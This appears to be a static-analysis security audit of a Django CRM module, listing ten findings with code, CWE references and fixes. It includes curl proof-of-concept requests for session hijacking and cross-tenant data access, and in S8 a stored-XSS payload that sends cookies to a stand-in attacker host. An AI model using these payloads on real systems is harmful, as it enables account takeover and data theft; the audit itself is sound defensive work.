# CRM Module — Security Report

**Audit date:** 2026-06-24  
**Method:** Read-only static analysis — no code was modified  
**Total security findings:** 10

---

## S1 — Session Key Exposed in Report Export URL

**File:** `backend/crm/reporting_views.py:55`, `backend/crm/reporting_views.py:127`  
**Severity:** CRITICAL  
**CWE:** CWE-598: Use of GET Request Method with Sensitive Query Strings  
**OWASP:** A07:2021 – Identification and Authentication Failures

**Code:**
```python
# reporting_views.py:55
export_url = f"/api/crm/reports/{template.id}/download/?format={format_type}&session_key={session_key}"
```

```python
# reporting_views.py:127
session_key = request.GET.get('session_key')
```

**Description:**  
The `export()` action constructs a download URL that embeds the live session key as a query string parameter. The client receives this URL and is expected to request it. The `download()` action then reads the session key from the GET query parameter.

**Consequences of session key in URL:**
- Appears in web server access logs (e.g., nginx/gunicorn `combined` log format)
- Appears in browser URL bar and browser history
- Sent in HTTP `Referer` header to any third-party resources on the same page
- Stored by CDN/proxy infrastructure
- Copied by users who share "download links"

**Proof-of-concept:**
```
# Any engineer with access to nginx logs sees:
[2026-06-24 10:32:11] "GET /api/crm/reports/5/download/?format=csv&session_key=abc123sessiontoken HTTP/1.1" 200

# That session_key can now be used to authenticate as the user:
curl -X GET /api/crm/leads/ -H "Authorization: Bearer abc123sessiontoken"
```

**Business Impact:** Session hijacking. Any user with access to server logs (sysadmin, devops, SIEM system, log aggregator) can impersonate any CRM user who downloaded a report.

**Recommendation:** Use POST-based download tokens — generate a short-lived (60-second), single-use token for downloads. The download URL carries the token, not the session key. Alternatively, require the session key in the `Authorization` header even for downloads.

---

## S2 — SQL Keyword Filter Rejects Legitimate Business Names

**File:** `backend/crm/security_utils.py:21–67`, `backend/crm/views.py:79–82`  
**Severity:** HIGH  
**CWE:** CWE-183: Permissive List of Allowed Inputs / False Negative Pattern  
**OWASP:** A04:2021 – Insecure Design

**Code:**
```python
# security_utils.py:21–22
SQL_INJECTION_PATTERNS = [
    r'(\b(SELECT|INSERT|UPDATE|DELETE|DROP|CREATE|ALTER|EXEC|UNION)\b)',
    ...
]

# security_utils.py:57–67
def validate_sql_injection(cls, value):
    value_upper = value.upper()
    for pattern in cls.SQL_INJECTION_PATTERNS:
        if re.search(pattern, value_upper, re.IGNORECASE):
            return False  # Rejects the field
    return True
```

```python
# views.py:79–82
for key, value in data.items():
    if isinstance(value, str):
        if not CRMSecurityValidator.validate_sql_injection(value):
            return Response({'error': f'Invalid characters in {key}'}, status=400)
```

**Description:**  
The SQL injection validator rejects ANY string containing words like `SELECT`, `UNION`, `INSERT`, `DELETE`, `UPDATE` as word-bounded tokens. This is applied to every string field in every create/update request.

**Legitimate business data that will be rejected:**
- Company name: "Select Technologies Ltd." → blocked (contains `SELECT`)
- Company name: "Union Bank of India" → blocked (contains `UNION`)
- Company name: "Alter Networks" → blocked (contains `ALTER`)
- Lead description: "Please create a new account for us" → blocked (contains `CREATE`)
- Note: "We need to update our contract terms" → blocked (contains `UPDATE`)
- Campaign name: "Delete Bad Leads Drive" → blocked (contains `DELETE`)

**Impact:** CRM is unusable for any company whose legal name, industry vertical, or standard business communications contain these SQL keywords. This is not a corner case — "Union", "Select", "Create", "Update", "Insert" are common English words in business contexts.

**Recommendation:** Django ORM already prevents SQL injection through parameterized queries. This regex-based check provides no additional security (ORM doesn't interpret user strings as SQL) and causes significant false positives. Remove the SQL keyword check entirely and rely on Django ORM's parameterization. XSS sanitization (also present in the validator) is separately justified and should be retained.

---

## S3 — `created_by` Audit Trail Set to Django Superuser as Fallback

**File:** `backend/crm/views.py:102–113`, `backend/crm/support_views.py:38–46`, `backend/crm/pipeline_views.py:80–88`  
**Severity:** HIGH  
**CWE:** CWE-285: Improper Authorization / Audit Trail Falsification  
**OWASP:** A09:2021 – Security Logging and Monitoring Failures

**Code:**
```python
# views.py:102–112
user_id = None
if hasattr(service_user, 'created_by') and service_user.created_by:
    user_id = service_user.created_by.id
else:
    # Fallback to company admin user or superuser
    from django.contrib.auth.models import User
    admin_user = User.objects.filter(is_superuser=True).first()
    if admin_user:
        user_id = admin_user.id
    else:
        return Response({'error': 'No valid user found for created_by field'}, status=400)
```

**Description:**  
When a `CompanyServiceUser` does not have a `created_by` (Django `User`) set, the code uses the first Django superuser (master admin) as the `created_by` for every record created by that service user. This pattern appears identically in at least three files: `views.py`, `support_views.py`, `pipeline_views.py`.

**Consequences:**
1. The master admin appears as the creator of hundreds of leads, contacts, and opportunities that they never created.
2. Audit trails become meaningless — forensic investigation cannot determine who actually created a record.
3. The `DataAuditLog` (phase4_models.py), if it were functional, would log the wrong actor.
4. If the Django admin user is later disabled, queries on `created_by` return None for all affected records.

**Reproduction:**
1. Create a `CompanyServiceUser` without setting `created_by` (likely the common state).
2. `POST /crm/leads/` → the new Lead.created_by = superuser.
3. `GET /crm/leads/{id}/` → `created_by_name` shows the master admin's name.

**Recommendation:** `CompanyServiceUser` should be the authoritative identity — either store a display name directly on `CompanyServiceUser`, or require `created_by` to be set on user creation and enforce it (not fall back silently). The superuser should never appear in tenant data.

---

## S4 — Global unique=True on Entity IDs Enables Cross-Tenant Enumeration

**File:** `backend/crm/models.py:39, 108, 185, 264, 399, 562, 749`  
**Severity:** HIGH  
**CWE:** CWE-200: Exposure of Sensitive Information to an Unauthorized Actor  
**OWASP:** A01:2021 – Broken Access Control

**Code:**
```python
# models.py:39
lead_id = models.CharField(max_length=50, unique=True)
```

**Description:**  
All major CRM entity IDs (`lead_id`, `contact_id`, `account_id`, `opportunity_id`, `campaign_id`, `ticket_id`, `deal_id`) have `unique=True` at the database level without `company` in the unique constraint. This creates cross-tenant uniqueness.

**Exploitation vector:**
```bash
# Company A tries to create their 1st lead; Company B already created LEAD-000001
# The insert fails with IntegrityError:
# UNIQUE constraint failed: crm_lead.lead_id

# Timing attack: by observing success/failure patterns, an attacker 
# can enumerate how many leads other companies have:
# Try LEAD-000001 through LEAD-010000 — successes indicate those leads exist
# This works because the error is UNIQUE violation, not a not-found (which would be scoped)
```

**Business Impact:** A competitor on the same SaaS instance can estimate the customer base size of other tenants by observing their lead ID space. At scale, the unique constraint failure also blocks legitimate multi-tenant use (two companies both creating their first lead via the fallback code path).

**Recommendation:** Change all entity ID fields to `unique_together = ['company', 'lead_id']` (and similarly for all entity types). This requires a migration and re-evaluation of fallback ID generation logic.

---

## S5 — Unscoped FK References Allow Cross-Tenant Data Linking

**File:** `backend/crm/serializers.py:62–77`, `backend/crm/serializers.py:228–248`  
**Severity:** HIGH  
**CWE:** CWE-284: Improper Access Control  
**OWASP:** A01:2021 – Broken Access Control

**Code:**
```python
# serializers.py:62–77
class OpportunitySerializer(serializers.ModelSerializer):
    class Meta:
        model = Opportunity
        fields = '__all__'
        read_only_fields = ['opportunity_id', 'created_at', 'updated_at', 'created_by', 'company']
# 'account' and 'contact' FK fields accept any PK — no company-scoped queryset
```

```python
# serializers.py:228–248
class DealSerializer(serializers.ModelSerializer):
    class Meta:
        model = Deal
        fields = '__all__'
        read_only_fields = ['deal_id', 'created_at', 'updated_at']
# 'account', 'contact', 'current_stage', 'opportunity' — all unscoped
```

**Description:**  
The `OpportunitySerializer` and `DealSerializer` accept `account` and `contact` primary keys from the request without validating that those objects belong to the session's company. An attacker with a valid session from Company A can create an Opportunity that references Company B's Account.

**Proof-of-concept:**
```bash
# Attacker is authenticated as Company A (session_key_A)
# Attacker knows (or guesses) that Account ID 500 belongs to Company B

curl -X POST /api/crm/opportunities/ \
  -H "Authorization: Bearer session_key_A" \
  -d '{
    "name": "Spy Opportunity",
    "account": 500,          # <- Company B account
    "contact": 800,          # <- Company B contact
    "amount": "50000",
    "expected_close_date": "2026-12-31"
  }'
# Company A now has an Opportunity linked to Company B's Account and Contact
# Subsequent reads of that Opportunity expose Company B's account name and contact info
```

**Business Impact:** Data exfiltration — Company A can read Company B's customer names, contact information, and deal values by creating cross-tenant Opportunity/Deal links and then reading them back.

**Recommendation:** Add company-scoped querysets to FK fields in serializers:
```python
account = serializers.PrimaryKeyRelatedField(
    queryset=Account.objects.filter(company=<session_company>)
)
```
This requires the serializer `__init__` or `validate_<field>()` method to receive the company context from the view.

---

## S6 — ThirdPartyIntegration API Keys Stored as Plaintext CharField

**File:** `backend/crm/phase4_models.py:37`  
**Severity:** HIGH  
**CWE:** CWE-312: Cleartext Storage of Sensitive Information  
**OWASP:** A02:2021 – Cryptographic Failures

**Code:**
```python
# phase4_models.py:37
api_key = models.CharField(max_length=500, blank=True)  # Encrypted
```

The comment says "Encrypted" but the field is a plain `CharField`. There is no `encrypted_field`, `django-cryptography`, or Fernet encryption applied anywhere in the model or its save/create path.

**Description:**  
API keys for third-party integrations (Gmail, Slack, payment gateways, calendar services, Salesforce, etc.) are stored as plaintext in the `crm_thirdpartyintegration` database table. Any read access to the database (backup, DB replica, DBA query, SQL injection in another part of the app) exposes all integration credentials.

**Business Impact:**
- If an attacker reads the database, they obtain live API keys for payment gateways, email providers, and calendar services of every tenant.
- Compromised payment gateway API key allows fraudulent charges.
- Compromised email API key allows sending phishing emails using the company's domain.
- Keys are not rotatable without re-entering them manually.

**Recommendation:** Encrypt API key values at the application layer before storing. Use `django-cryptography`, `django-fernet-fields`, or `Secret Manager` (AWS/GCP) with a reference token stored in the DB rather than the key itself.

---

## S7 — Ticket Agent Assignment Accepts Any User ID (Cross-Tenant)

**File:** `backend/crm/support_views.py:81–92`  
**Severity:** MEDIUM  
**CWE:** CWE-284: Improper Access Control  
**OWASP:** A01:2021 – Broken Access Control

**Code:**
```python
# support_views.py:82–91
agent_id = request.data.get('agent_id')
if agent_id:
    agent = User.objects.get(id=agent_id)  # No company scope
    ticket.assigned_to = agent
    ticket.save()
```

**Description:**  
The `assign` action on `TicketViewSet` accepts any Django User ID and assigns them to the ticket without verifying the user belongs to the same company. An attacker can enumerate User IDs and assign tickets to users from other companies.

**Proof-of-concept:**
```bash
curl -X POST /api/crm/tickets/10/assign/ \
  -H "Authorization: Bearer valid_session" \
  -d '{"agent_id": 999}'
# User 999 is from a different tenant; now assigned to ticket in Company A
```

**Business Impact:** Cross-tenant user reference in support assignments. Minor direct impact, but if the assigned user's name is shown in any UI ("Assigned to: Jane Smith from Acme Corp"), it reveals the existence of users from other tenants.

**Recommendation:** Filter by company: `User.objects.get(id=agent_id, companyserviceuser__company=ticket.company)`.

---

## S8 — EmailTemplate Stores Raw HTML Without Server-Side Sanitization

**File:** `backend/crm/phase3_models.py:24`  
**Severity:** MEDIUM  
**CWE:** CWE-79: Cross-Site Scripting (XSS) — Stored  
**OWASP:** A03:2021 – Injection

**Code:**
```python
# phase3_models.py:24
html_content = models.TextField()
```

**Description:**  
`EmailTemplate.html_content` stores arbitrary HTML with no sanitization or content security policy at the model level. If this HTML is later rendered directly in a web view (e.g., a preview screen), malicious JavaScript embedded in the template body executes in the viewer's browser.

**Scenario:**
1. Attacker with valid CRM access creates an email template with `html_content = '<script>document.location="https://attacker.com/steal?c="+document.cookie</script>'`.
2. Another user previews the template in a browser-based CRM UI.
3. Script executes — session cookie stolen.

**Business Impact:** Stored XSS within the CRM. If the frontend renders template HTML in an iframe without `sandbox` attribute, session hijacking is possible.

**Recommendation:** Use a server-side HTML sanitizer (e.g., `bleach`, `nh3`) that allows only permitted tags (formatting, links, images) and strips script/event-handler attributes when storing or rendering.

---

## S9 — Double Session Validation Creates Inconsistent Security Posture

**File:** `backend/crm/views.py:26–231`  
**Severity:** LOW  
**CWE:** CWE-284: Improper Access Control  
**OWASP:** A07:2021 – Identification and Authentication Failures

**Description:**  
`CRMBaseViewSet` declares:
```python
# views.py:27–28
authentication_classes = [ServiceUserSessionAuthentication]
permission_classes = [IsServiceUserAuthenticated]
```

Then every overridden method (`list`, `create`, `retrieve`, `update`, `destroy`) also manually re-queries the session:
```python
# views.py:51–61
def list(self, request, *args, **kwargs):
    session_key = self.get_session_key()
    if not session_key:
        return Response({'error': 'Session key required'}, status=401)
    try:
        session = ServiceUserSession.objects.get(session_key=session_key, is_active=True)
        return super().list(request, *args, **kwargs)
    except ServiceUserSession.DoesNotExist:
        return Response({'error': 'Invalid session'}, status=401)
```

**Risk:**
- Each request triggers at minimum 2 DB lookups for the session (once by `ServiceUserSessionAuthentication`, once by the method override).
- If the DRF auth class and the manual check disagree (e.g., one caches, one doesn't), there is a risk of inconsistent authentication outcomes.
- `@action` methods that do NOT override the session check explicitly (e.g., `deactivate()` in security_views.py:96) rely solely on the DRF auth class — inconsistent with the rest of the class.

**Business Impact:** Double session DB queries on every request (performance). Inconsistency in action handlers that skip the manual check (security).

---

## S10 — `ComplianceViolation.resolve()` Gets User From `session.service_user.created_by`

**File:** `backend/crm/security_views.py:139–142`  
**Severity:** LOW  
**CWE:** CWE-285: Improper Authorization  
**OWASP:** A07:2021 – Identification and Authentication Failures

**Code:**
```python
# security_views.py:139–142
try:
    session = ServiceUserSession.objects.get(session_key=session_key, is_active=True)
    user = session.service_user.created_by  # May be None
except ServiceUserSession.DoesNotExist:
    return Response({'error': 'Invalid session'}, status=401)

violation.resolved_by = user  # May be None
```

**Description:**  
The `resolved_by` field is set to `session.service_user.created_by`. If `created_by` is `None` (not set on the CompanyServiceUser), the field is silently stored as `NULL`. A compliance violation resolution with `resolved_by=NULL` is functionally unauditable — there is no record of who resolved it.

**Business Impact:** Compliance violations can be resolved anonymously, defeating the purpose of compliance tracking. In a regulatory audit, "resolved_by=NULL" may be treated as unauthorized resolution.
